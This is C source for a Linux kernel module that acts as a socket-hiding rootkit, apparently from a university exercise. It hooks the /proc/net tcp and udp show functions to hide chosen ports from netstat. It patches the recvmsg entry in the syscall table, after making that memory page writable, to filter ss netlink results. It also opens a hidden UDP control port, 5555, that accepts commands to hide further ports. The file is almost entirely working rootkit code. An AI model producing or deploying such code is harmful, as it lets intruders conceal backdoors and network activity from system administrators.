
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>
#include <linux/inet_diag.h>
#include <linux/tcp.h>

#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>



#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/skbuff.h>
#include <linux/delay.h>
#include <linux/inet.h>


#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module to hide sockets"

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;         /* use count */
	atomic_t in_use;        /* number of callers into module in progress; */
	/* negative -> it's going away rsn */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;   /* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};

/* Socket stuff */


#define SERVER_PORT 5555
static struct socket *recvsocket=NULL;
//static struct socket *clientsocket=NULL;

static DECLARE_COMPLETION( threadcomplete );
struct workqueue_struct *wq;

struct wq_wrapper{
	struct work_struct worker;
	struct sock * sk;
};

struct wq_wrapper wq_data;

static void cb_data(struct sock *sk, int bytes){
	wq_data.sk = sk;
	queue_work(wq, &wq_data.worker);
}

/* end Socket stuff */


int udpPorts[10];
int udpNumPorts;
module_param_array(udpPorts, int, &udpNumPorts, 0000);
MODULE_PARM_DESC(tcpPorts, "An array of the udp Ports that should be hidden");
int tcpPorts[10];
int tcpNumPorts;
module_param_array(tcpPorts, int, &tcpNumPorts, 0000);
MODULE_PARM_DESC(tcpPorts, "An array of the tcp Ports that should be hidden");

atomic_t in_orig_syscall = ATOMIC_INIT(0);

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; 

asmlinkage int (*original_tcp_show) (struct seq_file*, void *);
asmlinkage int (*original_udp_show) (struct seq_file*, void *);
asmlinkage int (*original_tcp6_show) (struct seq_file*, void *);
asmlinkage int (*original_udp6_show) (struct seq_file*, void *);
asmlinkage ssize_t (*original_recvmsg) (int, struct user_msghdr __user *, int);




static size_t iov_size(const struct user_msghdr *msg)
{
	size_t i;
	size_t size = 0;

	for (i = 0; i < msg->msg_iovlen; i++)
		size += msg->msg_iov[i].iov_len;
	return size;
}



bool checkTcpPort(int sport, int dport) {
	int i;	
	for(i = 0; i < tcpNumPorts; i++) {
		if(sport == tcpPorts[i] || dport == tcpPorts[i])
			return true;
	}
	return false;
}	

bool checkUdpPort(int sport, int dport) {
	int i;	
	for(i = 0; i < udpNumPorts; i++) {
		if(sport == udpPorts[i] || dport == udpPorts[i])
			return true;
	}
	return false;
}	

asmlinkage int hacked_tcp_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	//struct sock* socket;
	struct inet_sock* inet;
	//struct tcp_inter_state* state;
	//struct inet_request_sock* ireq;
	int sport, dport;
	atomic_inc(&in_orig_syscall); 
	if(SEQ_START_TOKEN == v) {
		printk("Start_token\n");
		atomic_dec(&in_orig_syscall);
		return original_tcp_show(sf,v);
	}

	//state = (struct tcp_inter_state*) sf->private;
	//switch(state->state) {
		//case TCP_SEQ_STATE_LISTENING:
		//case TCP_SEQ_STATE_ESTABLISHED:
			inet = inet_sk((struct sock*) v);//socket);
			sport = ntohs(inet->inet_sport);
			dport = ntohs(inet->inet_dport);
	
			if(checkTcpPort(sport,dport)){
				printk("hidePort: TCP from %d to %d\n", sport, dport);
				atomic_dec(&in_orig_syscall);
				return 0;
			}
			//break;
		//case TCP_SEQ_STATE_OPENREQ:
			//ireq = inet_rsk(v);
			//sport = ntohs(ireq->ir_loc_addr);
			//dport = ntohs(ireq->ir_loc_addr);
	
			//if(checkTcpPort(sport,dport)){
				//printk("Port:TCP openreq from %d to %d\n", sport, dport);
				// return 0
			//}
			//break;
		//default:
			//break;
		//}
	ret = original_tcp_show(sf,v);
	atomic_dec(&in_orig_syscall);
	return ret;
}

asmlinkage int hacked_tcp6_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	//struct tcp_inter_state* state;
	//struct inet_request_sock* ireq;
	int sport, dport;
	atomic_inc(&in_orig_syscall); 
	if(SEQ_START_TOKEN == v) {
		printk("Start_token\n");
		atomic_dec(&in_orig_syscall);
		return original_tcp_show(sf,v);
	}

	//state = sf->private;
	//switch(state->state) {
		//case TCP_SEQ_STATE_LISTENING:
		//case TCP_SEQ_STATE_ESTABLISHED:
			inet = inet_sk((struct sock*) v);//socket);
			sport = ntohs(inet->inet_sport);
			dport = ntohs(inet->inet_dport);
	
			if(checkTcpPort(sport,dport)){
				printk("hidePort: TCP6 from %d to %d\n", sport, dport);
				atomic_dec(&in_orig_syscall);
				return 0;
			}
			//break;
		//case TCP_SEQ_STATE_OPENREQ:
			//ireq = inet_rsk(v);
			//sport = ntohs(ireq->ir_loc_addr);
			//dport = ntohs(ireq->ir_loc_addr);
	
			//if(checkTcpPort(sport,dport)){
				//printk("Port:TCP6 openreq from %d to %d\n", sport, dport);
				// return 0
			//}
			//break;
		//default:
			//break;
		//}
	ret = original_tcp6_show(sf,v);
	atomic_dec(&in_orig_syscall);
	return ret;
}

asmlinkage int hacked_udp_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	int sport, dport;
	atomic_inc(&in_orig_syscall); 
	inet = inet_sk((struct sock*) v);
	if(SEQ_START_TOKEN == v) {
		printk("Start_token\n");
		atomic_dec(&in_orig_syscall);
		return original_tcp_show(sf,v);
	}
	sport = ntohs(inet->inet_sport);
	dport = ntohs(inet->inet_dport);

	if(checkUdpPort(sport,dport)){
		printk("hidePort: UDP from %d to %d\n", sport, dport);
		atomic_dec(&in_orig_syscall);
		return 0;
	}
	ret = original_udp_show(sf,v);
	atomic_dec(&in_orig_syscall);
	return ret;
}

asmlinkage int hacked_udp6_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	int sport, dport;
	atomic_inc(&in_orig_syscall); 
	inet = inet_sk((struct sock*) v);
	if(SEQ_START_TOKEN == v) {
		printk("Start_token\n");
		atomic_dec(&in_orig_syscall);
		return original_tcp_show(sf,v);
	}
	sport = ntohs(inet->inet_sport);
	dport = ntohs(inet->inet_dport);

	if(checkUdpPort(sport,dport)){
		printk("hidePort: UDP6 from %d to %d\n", sport, dport);
		atomic_dec(&in_orig_syscall);
		return 0;
	}
	ret = original_udp6_show(sf,v);
	atomic_dec(&in_orig_syscall);
	return ret;
}

bool checkNlm(struct nlmsghdr* nlm){
	int sport, dport;
	struct inet_diag_msg* msg;
	
	msg	= NLMSG_DATA(nlm);
	sport = ntohs(msg->id.idiag_sport);
	dport = ntohs(msg->id.idiag_dport);
	printk("Port: %d to %d\n", sport, dport);
	return checkUdpPort(sport, dport) || checkTcpPort(sport, dport);
}
/* Hide from ss (like back in the 30s... ) */
asmlinkage ssize_t hacked_recvmsg (int sockfd, struct user_msghdr __user *umsg, int flags)
{
	ssize_t ret = 0;
	long new_remain, remain;
	int sport, dport, err;
	struct socket* sock;
	struct sock* socket;
	struct nlmsghdr __user* uhdr;
	//struct nlmsghdr* hdr;
	struct msghdr msg;
	struct nlmsghdr* next_entry;
	atomic_inc(&in_orig_syscall); 
	
	//printk("RECVMSG: Start\n");
	ret = original_recvmsg(sockfd, umsg, flags);
	sock = sockfd_lookup(sockfd, &err);
	socket = sock->sk;

	if (socket->sk_family == AF_NETLINK && socket->sk_protocol == NETLINK_INET_DIAG) {
		//uhdr = umsg->msg_iov->iov_base;
		//hdr = kmalloc(sizeof(hdr), GFP_KERNEL);		
		//err = copy_from_user(hdr, uhdr, sizeof(hdr));
		remain = ret;
		
		//printk("RECVMSG: in if\n");


		msg.msg_name = umsg->msg_name;
		msg.msg_namelen = umsg->msg_namelen;
		msg.msg_control = umsg->msg_control;
		msg.msg_controllen = umsg->msg_controllen;
		msg.msg_flags = flags;

		iov_iter_init(&msg.msg_iter, READ,
				umsg->msg_iov, umsg->msg_iovlen, iov_size(umsg));




		// Copy data from user space to kernel space
		//msg = kmalloc(ret, GFP_KERNEL);
		//err = copy_from_user(msg, umsg, ret);
		if(msg.msg_iter.iov == NULL){
			printk("Pointer null\n");
			atomic_dec(&in_orig_syscall);	
			return ret;
		}
		//printk("Pointer Not NULL\n");
		struct nlmsghdr* hdr = (struct nlmsghdr*) msg.msg_iter.iov->iov_base; //msg->msg_iov->iov_base;
		//if (err) {
		//	atomic_dec(&in_orig_syscall);	
		//	return ret;
		//}

		// Iterate the entries
		do {
			struct inet_diag_msg* r = NLMSG_DATA(hdr);

			sport = ntohs(r->id.idiag_sport);
			dport = ntohs(r->id.idiag_dport);
			//printk("sport: %d, dport %d\n", sport, dport);
			if (checkTcpPort(sport, dport) || checkUdpPort(sport,dport)) {
				printk("found Port to hide from ss: %d to %d\n", sport,dport);
				// Hide the entry by coping the remaining entries over it
				new_remain = remain;
				next_entry = NLMSG_NEXT(hdr, new_remain);
				memmove(hdr, next_entry, new_remain);

				// Adjust the length variables
				ret -= (remain - new_remain);
				remain = new_remain;
			} else {
				// Nothing to do -> skip this entry
				hdr = NLMSG_NEXT(hdr, remain);
			}
		} while (remain > 0);

		// Copy data back to user space
		//err = copy_to_user(umsg, msg, ret);
		//err = copy_to_user(uhdr, hdr, sizeof(hdr));
		//kfree(msg);
		//kfree(hdr);
		if (err) {
			atomic_dec(&in_orig_syscall);	
			return ret;
		}
	}
	atomic_dec(&in_orig_syscall);	
	return ret;
}

/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

void parseCommand(char* msg)
{
	int newPort,i;
	if(strstr(msg, "hidetcp") != NULL){
		sscanf(msg+7, "%d", &newPort);
		printk("hide new tcp socket: %d\n", newPort);
		if(tcpNumPorts < 10){
			tcpPorts[tcpNumPorts] = newPort;
			tcpNumPorts++;
		} else {
			printk("sorry Array is full, can't hide new socket\n");
		}
	}
	if(strstr(msg, "hideudp") != NULL){
		sscanf(msg+7, "%d", &newPort);
		printk("hide new udp socket: %d\n", newPort);
		if(udpNumPorts < 10){
			udpPorts[udpNumPorts] = newPort;
			udpNumPorts++;
		} else {
			printk("sorry Array is full, can't hide new socket\n");
		}
	}

	if(strstr(msg, "showtcp") != NULL){
		sscanf(msg+7, "%d", &newPort);
		printk("hide new tcp socket: %d\n", newPort);

		for(i = 0; i < tcpNumPorts; i++){
			if(tcpPorts[i] == newPort)
				break;
		}
		for(; i < tcpNumPorts-1; i++){
			tcpPorts[i] = tcpPorts[i+1];
		}
		tcpPorts[tcpNumPorts - 1] = 0;
		tcpNumPorts--;

	}

	printk("New tcp ports: %d\n", tcpNumPorts);

	for(i = 0; i<tcpNumPorts; i++) {
		printk("Socket to be hidden: %d - TCP\n",tcpPorts[i]);
	}
	printk("New udp ports: %d\n", udpNumPorts);
	for(i = 0; i<udpNumPorts; i++) {
		printk("Socket to be hidden: %d - UDP\n",udpPorts[i]);
	}


}

void reactToUdpServer(struct work_struct *data)
{
	int len;
	struct  wq_wrapper * foo = container_of(data, struct  wq_wrapper, worker);
	printk("In reactToUperServer: Start\n");
	// as long as there are messages in the receive queue of this socket
	while((len = skb_queue_len(&foo->sk->sk_receive_queue)) > 0){
		struct sk_buff *skb = NULL;

		// receive packet
		skb = skb_dequeue(&foo->sk->sk_receive_queue);
		printk("message len: %i message: %s\n", skb->len - 8, skb->data+8); //8 for udp header
		parseCommand(skb->data+8);	

	}
}


int setupSocket(void)
{
	struct sockaddr_in server;
	int servererror;
	printk("Init of module udpSocket \n");

	// Create a socket 
	if (sock_create(PF_INET, SOCK_DGRAM, IPPROTO_UDP, &recvsocket) < 0) {
		printk("server: Error creating recvsocket.\n" );
		return -EIO;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons( (unsigned short)SERVER_PORT);

	// Check correctness 
	servererror = recvsocket->ops->bind(recvsocket, (struct sockaddr *) &server, sizeof(server ));
	if (servererror) {
		sock_release(recvsocket);
		printk("server: error in Checking stuff.\n" );
		return -EIO;
	}
	recvsocket->sk->sk_data_ready = cb_data;

	// create work queue 
	INIT_WORK(&wq_data.worker, reactToUdpServer);
	wq = create_singlethread_workqueue("myworkqueue");
	if (!wq){ //If it is not possible to create the work queue
		printk("server: Error creating workque.\n" );
		return -ENOMEM; //Return Error No kernel Memory
	}

	printk("server: done correct\n");
	return 0;
}

static int __init init_mod(void)
{	
	int i;
	struct proc_dir_entry *proc_subdir;
	struct proc_dir_entry *n;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;

	printk("inserting...\n");
		// hide our comunication socket
	udpPorts[udpNumPorts] = 5555;
	udpNumPorts++;

	printk("udpNumPorts: %d tcpNumPorts: %d\n",udpNumPorts, tcpNumPorts);
	for(i = 0; i<udpNumPorts; i++) {
		printk("Socket to be hidden: %d - UDP\n",udpPorts[i]);
	}
	for(i = 0; i<tcpNumPorts; i++) {
		printk("Socket to be hidden: %d - TCP\n",tcpPorts[i]);
	}
		// inserting hook for netstat hiding	
/*
	proc = init_net.proc_net;//->subdir;

	printk("procent: %s\n", proc->name);
	struct rb_node* nextrb = rb_first(&proc->subdir);
	proc_subdir = rb_entry_safe(nextrb, struct proc_dir_entry, subdir_node); 
*/

	 rbtree_postorder_for_each_entry_safe(proc_subdir, n, &init_net.proc_net->subdir, subdir_node) {

			// found dir tcp or tcp6
		if(strcmp(proc_subdir->name, "tcp")==0 ) {
			printk("Insert: Found tcp dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = hacked_tcp_show;
		}
		else if( strcmp(proc_subdir->name, "tcp6")==0 ) {
			printk("Insert: Found tcp dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			original_tcp6_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = hacked_tcp6_show;
		}
			// found dir udp or udp6
		else if(strcmp(proc_subdir->name, "udp6")==0) {
			printk("Insert: Found udp dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = hacked_udp_show;
		}
		else if(strcmp(proc_subdir->name, "udp")==0 ) {
			printk("Insert: Found udp dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			original_udp6_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = hacked_udp6_show;
		}
	}

		// Insert Hook for recvmsg (used by ss to find sockets)
	make_rw((unsigned long)sys_call_table);
	original_recvmsg = (void*)*(sys_call_table + __NR_recvmsg);
	*(sys_call_table + __NR_recvmsg) = (unsigned long)hacked_recvmsg;
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running; sockets should be hidden\n Starting server now...\n");
	if(setupSocket()!=0){
		printk("Socket: Failed to set up\n");
		return 0;
		}
	
	printk("Socket set up, everything ready\n");
	return 0;
}

static void __exit  exit_mod(void)
{
	struct proc_dir_entry *proc_subdir;
	struct proc_dir_entry *n;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	printk("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_recvmsg) = (unsigned long)original_recvmsg;
	make_ro((unsigned long)sys_call_table);


	rbtree_postorder_for_each_entry_safe(proc_subdir, n, &init_net.proc_net->subdir, subdir_node) {

		// found dir tcp or tcp6
		if(strcmp(proc_subdir->name, "tcp")==0 ) {
			printk("Removing: dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			tcp_seq->seq_ops.show = original_tcp_show;
		}
		else if( strcmp(proc_subdir->name, "tcp6")==0 ) {
			printk("Removing: dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			tcp_seq->seq_ops.show = original_tcp6_show;
		}
		// found dir udp or udp6
		else if(strcmp(proc_subdir->name, "udp6")==0) {
			printk("Removing: dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			udp_seq->seq_ops.show = original_udp_show;
		}
		else if(strcmp(proc_subdir->name, "udp")==0 ) {
			printk("Removing: dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			udp_seq->seq_ops.show = original_udp6_show;
		}
	}

	printk("cleaning up server\n");

	if (wq) {
		flush_workqueue(wq);
		destroy_workqueue(wq);
	}
	if (recvsocket)
		sock_release(recvsocket);
	if(atomic_read(&in_orig_syscall)!=0) 
		printk("waiting for instance to be finished %d\n",atomic_read(&in_orig_syscall));
	while(atomic_read(&in_orig_syscall)!=0){
		msleep(10);
	}
	printk("done\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
